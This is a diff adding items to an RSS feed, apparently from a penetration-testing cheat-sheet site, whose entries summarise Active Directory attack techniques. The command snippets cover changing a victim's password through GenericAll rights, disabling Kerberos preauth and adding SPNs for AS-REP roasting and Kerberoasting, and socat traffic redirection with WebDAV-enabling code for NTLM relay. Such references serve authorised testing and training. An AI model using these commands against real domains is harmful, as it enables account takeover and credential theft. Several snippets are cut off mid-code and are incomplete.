@@ -21,5 +21,19 @@
       <guid>https://tldrbins.github.io/genericall/</guid>
       <description>Abuse #1: Change target user password Linux Windows 0. Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install . 1. Add Full Control to current user dacledit.py -k &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;:&amp;lt;PASSWORD&amp;gt;&amp;#39; -dc-ip &amp;lt;DC&amp;gt; -principal &amp;lt;USER&amp;gt; -target-dn &amp;#39;OU=&amp;lt;TARGET_GROUP&amp;gt;,DC=&amp;lt;EXAMPLE&amp;gt;,DC=&amp;lt;COM&amp;gt;&amp;#39; -inheritance -action write -rights FullControl 2. Change password bloodyAD&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USERNAME&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; set password &amp;lt;TARGET_USER&amp;gt; &amp;lt;NEW_PASSWORD&amp;gt; Ref: bloodyAD&#xA;1. Import PowerView.ps1 . .\PowerView.ps1 2. Change target user password $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force Set-DomainUserPassword -Identity &amp;lt;TARGET_USER&amp;gt; -AccountPassword $password Abuse #2: Get shadow credentials Linux 0.</description>
     </item>
+    <item>
+      <title>GenericWrite</title>
+      <link>https://tldrbins.github.io/genericwrite/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/genericwrite/</guid>
+      <description>Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to target user Windows 1. Import PowerView . .\PowerView.ps1 2. Check target user Get-DomainUser &amp;lt;TARGET_USER&amp;gt; | ConvertFrom-UACValue 3. Add UF_DONT_REQUIRE_PREAUTH bit Set-DomainObject -Identity &amp;lt;TARGET_USER&amp;gt; -XOR @{useraccountcontrol=4194304} -Verbose 4. AS-REP Roasting # In local linux machine impacket-GetNPUsers &amp;#39;&amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt;&amp;#39; -no-pass -dc-ip &amp;lt;DC&amp;gt; Abuse #2 : Kerberoasting by adding spn Windows 1. Import PowerView . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = &amp;#39;&amp;lt;DOMAIN&amp;gt;\&amp;lt;USER&amp;gt;&amp;#39; $password = ConvertTo-SecureString &amp;lt;PASSWORD&amp;gt; -AsPlainText -Force $cred = new-object -typename System.</description>
+    </item>
+    <item>
+      <title>NTLM Relay Attack</title>
+      <link>https://tldrbins.github.io/ntlm_relay_attack/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/ntlm_relay_attack/</guid>
+      <description>NTLM Relay Attack 1. Run socat to redirect traffic (In Windows Target) # Upload socat.zip and unzip Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory(&amp;#39;c:\programdata\socat.zip&amp;#39;, &amp;#39;c:\programdata&amp;#39;) .\socat.exe tcp-listen:8090,reuseaddr,fork tcp:&amp;lt;LOCAL_IP&amp;gt;:80 Ref: socat&#xA;2. Enable webdav (In Windows Target) $Source = @&amp;#34; using System; using System.Text; using System.Security; using System.Collections.Generic; using System.Runtime.Versioning; using Microsoft.Win32.SafeHandles; using System.Runtime.InteropServices; using System.Diagnostics.CodeAnalysis; namespace JosL.WebClient{ public static class Starter{ [StructLayout(LayoutKind.Explicit, Size=16)] public class EVENT_DESCRIPTOR{ [FieldOffset(0)]ushort Id = 1; [FieldOffset(2)]byte Version = 0; [FieldOffset(3)]byte Channel = 0; [FieldOffset(4)]byte Level = 4; [FieldOffset(5)]byte Opcode = 0; [FieldOffset(6)]ushort Task = 0; [FieldOffset(8)]long Keyword = 0; } [StructLayout(LayoutKind.</description>
+    </item>
   </channel>
 </rss>
